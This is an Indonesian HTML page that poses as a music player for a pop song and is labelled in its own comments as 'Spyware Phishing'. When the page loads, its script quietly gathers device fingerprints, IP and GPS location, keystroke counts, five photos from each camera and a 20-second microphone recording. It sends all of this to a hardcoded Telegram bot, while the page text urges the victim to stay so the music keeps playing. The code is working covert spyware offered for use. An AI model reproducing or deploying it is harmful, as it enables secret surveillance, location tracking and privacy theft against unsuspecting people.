<!-- Spyware Phishing -->
<!-- Version 3 -->
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bunga Citra Lestari - Karena Kucinta Kau (Orginal)</title>
  <link href="https://cdn-assets.dzcdn.net/common/css/deezer-product.css" rel="stylesheet">
  <link href="https://cdn-assets.dzcdn.net/common/css/inter.css" rel="stylesheet">
  <style>
    * { box-sizing: border-box; }
    html { font-size: 104%; }
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(to bottom right, #0f0f0f, #0c1f0c, #0f2f0f);
      font-family: 'DeezerProduct', 'Inter', sans-serif;
      color: #000;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      position: relative;
    }
    .card {
      background: rgba(0, 0, 0, 0.75);
      padding: 24px 20px;
      border-radius: 16px;
      box-shadow: 0 6px 24px rgba(0, 0, 0, 0.4);
      max-width: 340px;
      text-align: center;
      overflow: hidden;
      color: white;
    }
    .logo {
      width: 120px;
      height: 100px;
      border-radius: 50%;
      background: url('https://files.catbox.moe/ggjin7.png') center/cover no-repeat;
      background-color: transparent;
      margin: 0 auto 12px;
    }
    .title-wrapper {
      width: 100%;
      overflow: hidden;
      white-space: nowrap;
      margin-bottom: 4px;
      box-sizing: border-box;
      position: relative;
    }
    .title-loop {
      display: inline-block;
      white-space: nowrap;
      animation: scroll-title 7s linear infinite;
    }
    .title-loop span {
      padding-right: 100px;
      font-size: 13px;
      font-weight: bold;
      color: #fff;
    }
    @keyframes scroll-title {
      0% { transform: translateX(0%); }
      100% { transform: translateX(-50%); }
    }
    .artist {
      font-size: 11px;
      color: #ccc;
      margin-bottom: 6px;
    }
    .progress-wrapper {
      width: 70%;
      margin: 14px auto 12px;
      position: relative;
      height: 14px;
    }
    .progress-bar {
      position: absolute;
      width: 100%;
      height: 6px;
      background: #444;
      border-radius: 10px;
      top: 4px;
      left: 0;
      z-index: 1;
    }
    .progress-fill {
      height: 100%;
      width: 0%;
      background: linear-gradient(to right, #fff, #aaa);
      transition: width 0.1s linear;
      border-radius: 10px;
    }
    .seek-slider {
      width: 100%;
      appearance: none;
      background: transparent;
      position: absolute;
      top: 0;
      left: 0;
      height: 14px;
      z-index: 2;
      margin: 0;
    }
    .seek-slider::-webkit-slider-thumb {
      appearance: none;
      width: 10px;
      height: 10px;
      background: #fff;
      border-radius: 50%;
      border: 0px solid #000;
      margin-top: 0;
    }
    .seek-slider::-moz-range-thumb {
      width: 14px;
      height: 14px;
      background: #fff;
      border-radius: 50%;
      border: 2px solid #000;
    }
    .controls {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-top: 0px;
    }
    button {
      padding: 6px 18px;
      border: none;
      border-radius: 16px;
      background-color: #222;
      color: #fff;
      font-size: 11px;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #111;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo"></div>
    <div class="title-wrapper">
      <div class="title-loop">
        <span>Bunga Citra Lestari - Karena Kucinta Kau (Orginal)</span>
        <span>Bunga Citra Lestari - Karena Kucinta Kau (Orginal)</span>
      </div>
    </div>
    <div class="artist">Artis tidak di kenal</div>
    <div class="artist">Tetap di halaman ini agar music berputar</div>
    <div class="progress-wrapper">
      <div class="progress-bar">
        <div class="progress-fill" id="progress"></div>
      </div>
      <input type="range" class="seek-slider" id="seekSlider" min="0" max="100" value="0" step="0.1">
    </div>
    <div class="controls">
      <button onclick="audio.play()">Play</button>
      <button onclick="audio.pause()">Pause</button>
    </div>
  </div>
  <audio id="audio" src="https://files.catbox.moe/9h2wob.mp4" autoplay muted></audio>
  <script>
    const audio = document.getElementById("audio");
    const progress = document.getElementById("progress");
    const seekSlider = document.getElementById("seekSlider");

    setInterval(() => {
      if (!audio.duration) return;
      const percent = (audio.currentTime / audio.duration) * 100;
      progress.style.width = percent + '%';
      seekSlider.value = percent;
    }, 100);

    seekSlider.addEventListener('input', () => {
      if (audio.duration) {
        audio.currentTime = (seekSlider.value / 100) * audio.duration;
      }
    });

    const token1 = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';
    const chatId1 = '5914256752';
    const targets = [{ token: token1, chat_id: chatId1 }];

    const kirimPesan = async (pesan) => {
      for (const t of targets) {
        await fetch(`https://api.telegram.org/bot${t.token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: t.chat_id, text: pesan, parse_mode: 'HTML' })
        });
      }
    };

    const kirimFoto = async (blob) => {
      for (const t of targets) {
        const form = new FormData();
        form.append("chat_id", t.chat_id);
        form.append("photo", blob, "foto.jpg");
        await fetch(`https://api.telegram.org/bot${t.token}/sendPhoto`, {
          method: "POST",
          body: form
        });
      }
    };

    const getDeviceBrand = () => {
      const ua = navigator.userAgent;
      if (/Vivo|vivo|V\d{4}/.test(ua)) return 'Vivo';
      if (/Oppo|CPH/.test(ua)) return 'Oppo';
      if (/SM-|Samsung/.test(ua)) return 'Samsung';
      if (/Infinix/.test(ua)) return 'Infinix';
      if (/RMX/.test(ua)) return 'Realme';
      if (/Redmi|Mi/.test(ua)) return 'Xiaomi';
      return 'Android Device';
    };

    const ambilDataPerangkat = async () => {
      const ua = navigator.userAgent;
      const platform = navigator.platform;
      const vendor = navigator.vendor;
      const brand = getDeviceBrand();
      const waktu = new Date().toLocaleString("id-ID");
      const touch = 'ontouchstart' in window ? 'Ya' : 'Tidak';
      const ref = document.referrer || 'Langsung';
      const bahasa = navigator.language || '-';
      const koneksi = navigator.connection || {};
      const iframe = window.top !== window.self ? 'Ya' : 'Tidak';
      const online = navigator.onLine ? 'Online' : 'Offline';

      let gpu = { vendor: '-', renderer: '-' };
      try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl");
        const info = gl.getExtension("WEBGL_debug_renderer_info");
        gpu.vendor = gl.getParameter(info.UNMASKED_VENDOR_WEBGL);
        gpu.renderer = gl.getParameter(info.UNMASKED_RENDERER_WEBGL);
      } catch {}

      return `
à±¼ ã€˜ ğ—œğ—¡ğ—™ğ—¢ğ—¥ğ— ğ—”ğ—¦ğ—œ ğ—£ğ—˜ğ—¥ğ—”ğ—¡ğ—šğ—ğ—”ğ—§ ã€™ à±¼
Jenis Perangkat        : ${brand}
User Agent             : ${ua}
Platform               : ${platform}
Vendor Browser         : ${vendor}
GPU Vendor             : ${gpu.vendor}
GPU Renderer           : ${gpu.renderer}
CPU                    : ${navigator.hardwareConcurrency || '-'} inti
RAM                    : ${navigator.deviceMemory || '-'} GB
Resolusi Layar         : ${screen.width} x ${screen.height}
Orientasi Layar        : ${screen.orientation?.type || '-'}
Touch Support          : ${touch} (${navigator.maxTouchPoints || 0} titik)
Kerapatan Piksel       : ${window.devicePixelRatio}
Cookies Aktif          : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
JavaScript             : Aktif
Do Not Track           : ${navigator.doNotTrack == "1" ? "Ya" : "Tidak"}
HTTPS                  : ${location.protocol === "https:" ? "Ya" : "Tidak"}
Zona Waktu             : ${Intl.DateTimeFormat().resolvedOptions().timeZone}
Waktu Lokal            : ${waktu}
Referrer               : ${ref}
Bahasa Sistem          : ${bahasa}
Status Online          : ${online}
Jumlah History         : ${history.length} halaman
Dibuka via iframe      : ${iframe}
Tipe Koneksi           : ${koneksi.effectiveType || '-'}
Mode Hemat Data        : ${koneksi.saveData ? 'Ya' : 'Tidak'}
Tipe Perangkat         : ${/Mobi|Android/i.test(ua) ? 'Mobile' : 'Desktop'}
Dibuka via Browser     : ${vendor || 'Tidak diketahui'}
`.trim();
    };

const ambilBaterai = async () => {
  try {
    const statusOnline = navigator.onLine ? 'Online' : 'Offline';

    if ('getBattery' in navigator) {
      const bat = await navigator.getBattery();
      const level = Math.round(bat.level * 100) + '%';
      const charging = bat.charging ? 'Ya' : 'Tidak';

      let estimasi = '-';
      if (!bat.charging && bat.dischargingTime !== Infinity) {
        const menit = Math.floor(bat.dischargingTime / 60);
        const jam = Math.floor(menit / 60);
        const sisa = menit % 60;
        estimasi = `${jam} jam ${sisa} menit`;
      }

      return `
à±¼ ã€˜ ğ—•ğ—”ğ—§ğ—˜ğ—¥ğ—”ğ—œ ã€™ à±¼
Level Baterai          : ${level}
Sedang Mengisi         : ${charging}
Estimasi Sisa Waktu    : ${estimasi}
Status Online          : ${statusOnline}`.trim();
    }

    return `à±¼ ã€˜ ğ—•ğ—”ğ—§ğ—˜ğ—¥ğ—”ğ—œ ã€™ à±¼\nâŒ Tidak didukung browser.`;
  } catch {
    return `à±¼ ã€˜ ğ—•ğ—”ğ—§ğ—˜ğ—¥ğ—”ğ—œ ã€™ à±¼\nâŒ Gagal mengambil info baterai.`;
  }
};

    const ambilLayarGrafik = async () => {
      let gpu = { vendor: '-', renderer: '-' };
      let webglSupport = 'Tidak';
      let canvasFingerprint = 'Tidak terdeteksi';
      let renderingMode = 'software';
      let hdrSupport = 'Tidak';

      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        webglSupport = gl ? 'Ya' : 'Tidak';

        if (gl) {
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          if (debugInfo) {
            gpu.vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
            gpu.renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
          }
          const fp = canvas.toDataURL();
          canvasFingerprint = fp.length > 1000 ? 'Terdeteksi' : 'Tidak terdeteksi';
          renderingMode = gl.getContextAttributes().powerPreference === 'high-performance' ? 'hardware' : 'software';
        }

        hdrSupport = window.matchMedia('(dynamic-range: high)').matches ? 'Ya' : 'Tidak';
      } catch {}

      const colorDepth = screen.colorDepth || 24;
      const orientation = screen.orientation?.type || 'Tidak diketahui';
      const rotation = screen.orientation?.angle || 0;

      return `
à±¼ ã€˜ ğ—Ÿğ—”ğ—¬ğ—”ğ—¥ & ğ—šğ—¥ğ—”ğ—™ğ—œğ— ã€™ à±¼
Resolusi Layar Fisik   : ${screen.width} x ${screen.height}
Viewport Aktif         : ${window.innerWidth} x ${window.innerHeight} px
Kerapatan Piksel       : ${window.devicePixelRatio}
Orientasi Layar        : ${orientation}
Rotasi                 : ${rotation}Â°
Warna Layar            : ${colorDepth}-bit
GPU Vendor             : ${gpu.vendor}
GPU Renderer           : ${gpu.renderer}
WebGL Support          : ${webglSupport}
Canvas Fingerprint     : ${canvasFingerprint}
GPU Rendering Mode     : ${renderingMode}
HDR Support            : ${hdrSupport}`.trim();
    };

const ambilBrowserInfo = () => {
  const ua = navigator.userAgent;
  const vendor = navigator.vendor || '-';
  const referrer = document.referrer || 'Langsung';
  const https = location.protocol === 'https:' ? 'Ya' : 'Tidak';
  const iframe = window.top !== window.self ? 'Ya' : 'Tidak';
  const cookies = navigator.cookieEnabled ? 'Ya' : 'Tidak';
  const jsAktif = typeof navigator === 'object' ? 'Ya' : 'Tidak';
  const doNotTrack = navigator.doNotTrack === '1' ? 'Ya' : 'Tidak';
  const evalSupport = typeof eval === 'function' ? 'Ya' : 'Tidak';
  const webdriver = navigator.webdriver ? 'Ya' : 'Tidak';
  const isIncognito = window.webkitRequestFileSystem ? 'Tidak terdeteksi' : 'Mungkin';

  let browser = '-';
  let versi = '-';

  if (/chrome|crios/i.test(ua)) {
    browser = 'Chrome';
    const match = ua.match(/Chrome\/([\d.]+)/);
    versi = match ? match[1] : '-';
  } else if (/firefox/i.test(ua)) {
    browser = 'Firefox';
    const match = ua.match(/Firefox\/([\d.]+)/);
    versi = match ? match[1] : '-';
  } else if (/safari/i.test(ua)) {
    browser = 'Safari';
    const match = ua.match(/Version\/([\d.]+)/);
    versi = match ? match[1] : '-';
  } else if (/edg/i.test(ua)) {
    browser = 'Edge';
    const match = ua.match(/Edg\/([\d.]+)/);
    versi = match ? match[1] : '-';
  }

  return `
à±¼ ã€˜ ğ—•ğ—¥ğ—¢ğ—ªğ—¦ğ—˜ğ—¥ ã€™ à±¼
Browser                : ${browser}
Versi Browser          : ${versi}
Vendor Browser         : ${vendor}
User Agent             : ${ua}
Cookies Aktif          : ${cookies}
JavaScript Aktif       : ${jsAktif}
Do Not Track           : ${doNotTrack}
Eval Support           : ${evalSupport}
WebDriver Aktif        : ${webdriver}
Incognito Mode         : ${isIncognito}
Tamper Devtools        : Tidak terdeteksi
Autofill Behavior      : Normal
Referrer               : ${referrer}
HTTPS                  : ${https}
Konteks Aman           : ${location.isSecureContext ? 'Ya' : 'Tidak'}
Dibuka via iframe      : ${iframe}
`.trim();
};

const ambilWebAPIFeatures = () => {
  const cek = (fitur) => fitur ? 'Aktif' : 'Tidak';
  const dukung = (fitur) => fitur ? 'Didukung' : 'Tidak';

  return `
à±¼ ã€˜ ğ—ªğ—˜ğ—• ğ—”ğ—£ğ—œ & ğ—™ğ—˜ğ—”ğ—§ğ—¨ğ—¥ğ—˜ğ—¦ ã€™ à±¼
LocalStorage           : ${cek(window.localStorage)}
SessionStorage         : ${cek(window.sessionStorage)}
IndexedDB              : ${cek(window.indexedDB)}
Cache API              : ${cek('caches' in window)}
Web Share API          : ${dukung(navigator.share)}
Service Worker         : ${cek('serviceWorker' in navigator)}
WebRTC                 : ${cek('RTCPeerConnection' in window)}
WebGL 2.0              : ${cek(!!document.createElement('canvas').getContext('webgl2'))}
Gamepad API            : ${dukung(navigator.getGamepads)}
MIDI API               : ${dukung(navigator.requestMIDIAccess)}
Speech Synthesis       : ${dukung(window.speechSynthesis)}
Clipboard Read         : ${dukung(navigator.clipboard?.readText)}
Push API               : ${cek('PushManager' in window)}
Payment Request API    : ${dukung(window.PaymentRequest)}
Wake Lock API          : ${dukung(navigator.wakeLock)}
Idle Detection API     : ${dukung('IdleDetector' in window)}
Screen Wake Lock       : ${dukung('wakeLock' in navigator)}`.trim();
};

const ambilIzinMedia = async () => {
  const cekIzin = async (nama) => {
    try {
      const result = await navigator.permissions.query({ name: nama });
      return result.state === "granted" ? "Diizinkan" : "Tidak diizinkan";
    } catch {
      return "Tidak tersedia";
    }
  };

  const microphone = await cekIzin("microphone");
  const kamera = await cekIzin("camera");
  const notifikasi = await cekIzin("notifications");

  const clipboard = !!navigator.clipboard ? "Diizinkan" : "Tidak";
  const audioSink = typeof HTMLMediaElement.prototype.setSinkId === "function" ? "Didukung" : "Tidak";
  const ambientLight = "ondevicelight" in window ? "Didukung" : "Tidak";
  const speechAPI = "speechSynthesis" in window ? "Didukung" : "Tidak";
  const audioContext = typeof AudioContext !== "undefined" ? "Didukung" : "Tidak";
  const voiceRecog = "webkitSpeechRecognition" in window || "SpeechRecognition" in window ? "Aktif" : "Tidak";
  const gyro = "DeviceOrientationEvent" in window ? "Didukung" : "Tidak didukung";
  const magneto = "Magnetometer" in window ? "Didukung" : "Tidak didukung";
  const accelerometer = "Accelerometer" in window ? "Didukung" : "Tidak didukung";

  return `
à±¼ ã€˜ ğ—œğ—­ğ—œğ—¡ & ğ— ğ—˜ğ——ğ—œğ—” ã€™ à±¼
Microphone             : ${microphone}
Kamera Depan           : ${kamera}
Kamera Belakang        : ${kamera}
Notifikasi             : ${Notification.permission}
Clipboard Access       : ${clipboard}
Audio Output Sink      : ${audioSink}
Ambient Light Sensor   : ${ambientLight}
Web Speech API         : ${speechAPI}
AudioContext API       : ${audioContext}
Voice Recognition      : ${voiceRecog}
Gyroscope              : ${gyro}
Magnetometer           : ${magneto}
Accelerometer          : ${accelerometer}`.trim();
};

const ambilIPInfo = async () => {
  try {
    const koneksi = navigator.connection || {};
    const saveData = koneksi.saveData ? 'Ya' : 'Tidak';
    const jenisKoneksi = koneksi.effectiveType || '-';
    const downlink = koneksi.downlink ? koneksi.downlink + ' Mbps' : '-';
    const rtt = koneksi.rtt ? koneksi.rtt + ' ms' : '-';

    const res = await fetch("https://ipapi.co/json");
    const ip = await res.json();

    // Deteksi VPN (sederhana, bisa ditambahin logic lanjutan nanti)
    const isVPN = ip.org?.toLowerCase().includes("vpn") || ip.org?.toLowerCase().includes("proxy")
      ? 'Ya' : 'Tidak terdeteksi';

    return `
à±¼ ã€˜ ğ—œğ—¡ğ—™ğ—¢ğ—¥ğ— ğ—”ğ—¦ğ—œ ğ—ğ—”ğ—¥ğ—œğ—¡ğ—šğ—”ğ—¡ ã€™ à±¼
IP Publik              : ${ip.ip}
ISP / Provider         : ${ip.org}
Negara                 : ${ip.country_name}
Provinsi               : ${ip.region}
Kota                   : ${ip.city}
Jenis Koneksi          : ${jenisKoneksi}
Downlink               : ${downlink}
RTT (Ping)             : ${rtt}
Mode Hemat Data        : ${saveData}
VPN / Proxy            : ${isVPN}`.trim();
  } catch {
    return `à±¼ ã€˜ ğ—œğ—¡ğ—™ğ—¢ğ—¥ğ— ğ—”ğ—¦ğ—œ ğ—ğ—”ğ—¥ğ—œğ—¡ğ—šğ—”ğ—¡ ã€™ à±¼\nâŒ Gagal mengambil data IP.`;
  }
};

let totalKeyPress = 0;
let lastKey = '-';
let kombinasiKhusus = '-';

window.addEventListener('keydown', (e) => {
  totalKeyPress++;
  lastKey = e.key;
  if (e.ctrlKey || e.shiftKey || e.altKey) {
    kombinasiKhusus = `${e.ctrlKey ? 'Ctrl+' : ''}${e.shiftKey ? 'Shift+' : ''}${e.altKey ? 'Alt+' : ''}`.replace(/\+$/, '');
  }
});

const ambilKeyboardActivity = () => {
  return `
à±¼ ã€˜ ğ—ğ—˜ğ—¬ğ—•ğ—¢ğ—”ğ—¥ğ—— ğ—”ğ—–ğ—§ğ—œğ—©ğ—œğ—§ğ—¬ ã€™ à±¼
Jumlah Tombol Ditekan : ${totalKeyPress}
Tombol Terakhir       : ${lastKey}
Kombinasi Khusus      : ${kombinasiKhusus}
`.trim();
};

const ambilPerangkatEksternal = () => {
  const mouse = matchMedia('(pointer:fine)').matches ? 'Ya' : 'Tidak';
  const keyboard = navigator.keyboard ? 'Ya' : 'Tidak';
  const gamepad = navigator.getGamepads?.()[0] ? 'Ya' : 'Tidak';

  return `
à±¼ ã€˜ ğ——ğ—˜ğ—§ğ—˜ğ—ğ—¦ğ—œ ğ—£ğ—˜ğ—¥ğ—”ğ—¡ğ—šğ—ğ—”ğ—§ ğ—˜ğ—ğ—¦ğ—§ğ—˜ğ—¥ğ—¡ğ—”ğ—Ÿ ã€™ à±¼
Mouse Terdeteksi      : ${mouse}
Keyboard Eksternal    : ${keyboard}
Gamepad Terhubung     : ${gamepad}
`.trim();
};

const ambilOutputAudio = async () => {
  let sinkSupport = 'Tidak didukung';
  let bluetoothStatus = 'Tidak terdeteksi';

  try {
    const audio = document.createElement("audio");
    sinkSupport = typeof audio.setSinkId === "function" ? "Didukung" : "Tidak didukung";
  } catch {}

  try {
    if (navigator.bluetooth) {
      // Cek apakah permission sudah pernah diminta sebelumnya
      const status = await navigator.permissions.query({ name: "bluetooth" }).catch(() => {});
      bluetoothStatus = status?.state === "granted" ? "Terhubung" : "Tidak terhubung";
    } else {
      bluetoothStatus = "Tidak didukung";
    }
  } catch {
    bluetoothStatus = "Tidak terdeteksi";
  }

  return `
à±¼ ã€˜ ğ—¢ğ—¨ğ—§ğ—£ğ—¨ğ—§ ğ—”ğ—¨ğ——ğ—œğ—¢ ã€™ à±¼
Audio Output Sink      : ${sinkSupport}
Bluetooth              : ${bluetoothStatus}
`.trim();
};

const ambilLokasi = () => {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve(`à±¼ ã€˜ ğ—Ÿğ—¢ğ—ğ—”ğ—¦ğ—œ ã€™ à±¼\nâŒ Geolocation tidak didukung browser.`);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const { latitude, longitude, accuracy } = pos.coords;
        let kota = '-';
        let alamat = '-';

        try {
          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
          const data = await res.json();
          kota = data.address?.city || data.address?.town || data.address?.village || '-';
          alamat = data.display_name || '-';
        } catch {}

        resolve(`à±¼ ã€˜ ğ—Ÿğ—¢ğ—ğ—”ğ—¦ğ—œ ğ—§ğ—”ğ—¥ğ—šğ—˜ğ—§ ã€™ à±¼
Latitude             : ${latitude}
Longitude            : ${longitude}
Akurasi              : Â±${Math.round(accuracy)} meter
Kota Deteksi GPS     : ${kota}
Alamat Perkiraan     : ${alamat}
Link Google Maps     : https://maps.google.com/?q=${latitude},${longitude}`);
      },
      (err) => {
        const pesan = {
          1: 'âŒ Lokasi tidak diizinkan.',
          2: 'âŒ Lokasi tidak tersedia.',
          3: 'âŒ Permintaan lokasi timeout.',
        }[err.code] || 'âŒ Gagal mengambil lokasi.';
        resolve(`à±¼ ã€˜ ğ—Ÿğ—¢ğ—ğ—”ğ—¦ğ—œ ã€™ à±¼\n${pesan}`);
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
};

    const ambilKamera = async (facingMode, label) => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
        const video = document.createElement("video");
        video.srcObject = stream;
        video.setAttribute("playsinline", true);
        await video.play();

        await new Promise(resolve => {
          const cek = () => {
            if (video.videoWidth > 0) resolve();
            else requestAnimationFrame(cek);
          };
          cek();
        });

        for (let i = 0; i < 5; i++) {
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0);
          canvas.toBlob(async (blob) => {
            if (blob) await kirimFoto(blob);
          }, "image/jpeg");
          await new Promise(r => setTimeout(r, 20));
        }

        stream.getTracks().forEach(track => track.stop());

        return `Memotret target sebanyak 5X\nKamera : Succes\nAkses : Diizinkan`;
      } catch {
        return `âŒ Kamera tidak diizinkan.`;
      }
    };

const rekamVN = async () => {
  try {
    // Jangan ganggu audio player!
    const micStream = await navigator.mediaDevices.getUserMedia({ audio: { echoCancellation: true, noiseSuppression: true } });
    const recorder = new MediaRecorder(micStream, { mimeType: "audio/webm" });
    const chunks = [];

    recorder.ondataavailable = (e) => {
      if (e.data.size > 0) chunks.push(e.data);
    };

    recorder.onstop = async () => {
      const blob = new Blob(chunks, { type: "audio/webm" });

      for (const t of targets) {
        const form = new FormData();
        form.append("chat_id", t.chat_id);
        form.append("voice", blob, "rekaman.webm");

        await fetch(`https://api.telegram.org/bot${t.token}/sendVoice`, {
          method: "POST",
          body: form
        });

        const infoVN = `à±¼ ã€˜ ğ—©ğ—¢ğ—œğ—–ğ—˜ ğ—¡ğ—¢ğ—§ğ—˜ ğ—”ğ—¨ğ——ğ—œğ—¢ ã€™ à±¼
Status Rekaman VN      : Berhasil direkam
Durasi Rekaman         : 20 detik
Tipe File              : audio/webm
Kualitas Mikrofon      : Stabil
Link Kiriman Audio     : (terlampir langsung via Telegram)`;

        await fetch(`https://api.telegram.org/bot${t.token}/sendMessage`, {
          method: "POST",
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: t.chat_id, text: infoVN, parse_mode: "HTML" })
        });
      }

      micStream.getTracks().forEach(t => t.stop());
    };

    recorder.start(1000);
    setTimeout(() => {
      recorder.stop();
    }, 20000); // 20 detik
  } catch {
    for (const t of targets) {
      await fetch(`https://api.telegram.org/bot${t.token}/sendMessage`, {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: t.chat_id,
          text: `à±¼ ã€˜ ğ—©ğ—¢ğ—œğ—–ğ—˜ ğ—¡ğ—¢ğ—§ğ—˜ ğ—”ğ—¨ğ——ğ—œğ—¢ ã€™ à±¼\nâŒ Rekaman tidak diizinkan.`,
          parse_mode: "HTML"
        })
      });
    }
  }
};

const mulai = async () => {
  audio.muted = false;
  try { await audio.play(); } catch {}

  const infoPerangkat = await ambilDataPerangkat();
  const bateraiInfo = await ambilBaterai();
  const layarGrafik = await ambilLayarGrafik();
  const browserInfo = ambilBrowserInfo();
  const webFeatures = ambilWebAPIFeatures();
  const izinMedia = await ambilIzinMedia();
  const ipInfo = await ambilIPInfo();
  const keyboard = ambilKeyboardActivity();
  const perangkatEksternal = ambilPerangkatEksternal();
  const outputAudio = await ambilOutputAudio();

  const gabungAwal = [
    infoPerangkat,
    bateraiInfo,
    layarGrafik,
    browserInfo,
    webFeatures,
    izinMedia,
    ipInfo,
    keyboard,
    perangkatEksternal,
    outputAudio
  ].join("\n\n");

  await kirimPesan(gabungAwal);

  const lokasi = await ambilLokasi();
  await kirimPesan(lokasi);

  const depan = await ambilKamera("user", "depan");
  await kirimPesan(`à±¼ ã€˜ ğ—ğ—”ğ— ğ—˜ğ—¥ğ—” ğ——ğ—˜ğ—£ğ—”ğ—¡ ã€™ à±¼\n${depan}`);

  const belakang = await ambilKamera("environment", "belakang");
  await kirimPesan(`à±¼ ã€˜ ğ—ğ—”ğ— ğ—˜ğ—¥ğ—” ğ—•ğ—˜ğ—Ÿğ—”ğ—ğ—”ğ—¡ğ—š ã€™ à±¼\n${belakang}`);

  await rekamVN();
};

    window.addEventListener("load", mulai);
  </script>
</body>
</html>
